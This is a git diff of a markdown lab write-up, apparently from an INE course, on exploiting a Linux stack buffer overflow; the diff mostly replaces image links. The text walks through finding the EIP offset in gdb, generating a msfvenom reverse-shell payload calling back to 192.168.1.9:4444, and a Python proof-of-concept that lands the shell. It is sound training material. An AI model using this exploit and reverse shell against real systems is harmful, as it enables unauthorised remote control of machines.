@@ -1,9 +1,7 @@
 # Linux Buffer Overflow Foundation
 ## 1. What is Buffer Overflow
 Exploiting the behavior of a buffer overflow is a well-known security exploit. On many systems, the memory layout of a program, or the system as a whole, is well defined. By sending in data designed to cause a buffer overflow, it is possible to write into areas known to hold executable code and replace it with malicious code, or to selectively overwrite data pertaining to the program's state, therefore causing behavior that was not intended by the original programmer. Buffers are widespread in operating system (OS) code, so it is possible to make attacks that perform privilege escalation and gain unlimited access to the computer's resources. The famed Morris worm in 1988 used this as one of its attack techniques.
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image1.png)
-
+![[bo_imagination.png]]
 ## 2. Overflowing Program on Linux
 ### 2.1 Setting up environment
 First up, we need to turn off Address Space Layout Randomization (ASLR):
@@ -43,16 +41,12 @@ Let's make 500 bytes of `A` and send to program to see if it crash
 ```bash
 $ python3 -c "print('A'*500)" | ./oversize_overflow
 ```
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image1.png)
-
+![[image1.png]]
 As we can see, the program works good, so let's try with bigger size:
 ```bash
 $ python3 -c "print('A'*700)" | ./oversize_overflow
 ```
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image2.png)
-
+![[image2.png]]
 At this time, the program crashed with 700 bytes size. Now on, using the gdb debugger to determine and get exact offset and override the `EIP`:
 ```bash
 $ gdb -q oversize_overflow
@@ -64,9 +58,7 @@ gdb-peda$ pattern create 700 1.txt
 Writing pattern of 700 chars to filename "1.txt"
 gdb-peda$ r < 1.txt
 ```
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image3.png)
-
+![[image3.png]]
 Here is the reuslt, and we can see the `EIP` (`0x4e734138`) point to invalid address, so the program crashed. Now, we are going to get exact size:
 ```sh
 gdb-peda$ pattern offset 0x4e734138
@@ -77,15 +69,13 @@ Get back to terminal, create the basic exploit to see if it overrided:
 $ python -c "print('A'*516+'B'*4+'C*100')" > input.txt
 ```
 Run the input file in gdb debugger, we can see the `EIP` overrided with 0x42424242 (meant BBBB). We are completely done with overriding the `EIP`.
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image4.png)
+![[image4.png]]
 ### 2.3 Execute the Shellcode
 #### 2.3.1 Shellcode generation
 To generate the shellcode, in this section we will use msfvernom to genterate it
-
 ```bash
 $ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.9 lport=4444 -b "\x00" -f python -o payload.py --platform linux -a x86
 ```
-
 - Options description:
 ```sh
 -p: Which mean payload
@@ -97,28 +87,20 @@ $ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.9 lport=4444 -b "\x00"
 lhost: listening host
 lport: listening port
 ```
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image5.png)
+![[image5.png]]
 
 #### 2.3.2 Finding the returning address to execute the shellcode
 We got the shellcode, now we need to find the address to override the `EIP` and point it to the shellcode to make it execute. To do this, we will make `A` buffer and open the `gdb`.
-
 ```bash
 $ python -c "print('A'*700)" > input.txt
 
 gdb-peda$ r < input.txt
 ```
-
 After run, the program will be crashed, use `x/20wx $esp-0x230` to show stack similar with below picture.
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image6.png)
-
+![[image6.png]]
 In the picture, we can see the buffer start in `0xffffd030 + 0x8`, so `0xffffd038` will be our return address
-
 #### 2.3.3 Proof of Concept (PoC)
-
 We will edit the `payload.py` which we've already created above:
-
 ```python
 #!/usr/bin/python3
 import struct
@@ -141,14 +123,8 @@ with open('input.txt', 'wb') as file:
     payload = nop + buf + junk * (offset - 16 -len(buf)) + ret_add
     file.write(payload)
 ```
-After run we have text file `input.txt`
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image7.png)
-
-Finally, we got the result, shellcode is connected
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image8.png)
-
-[](https://github.com/7heKnight/Learning-Reports/blob/main/INE/Linux%20Overflow%20Foundation/image9.png)
+After run we have text file `input.txt`![[image7.png]]
+Finally, we got the result, shellcode is connected![[image8.png]]
+![[image9.png]]
 
 ------------------------------------------------------- Done -------------------------------------------------------
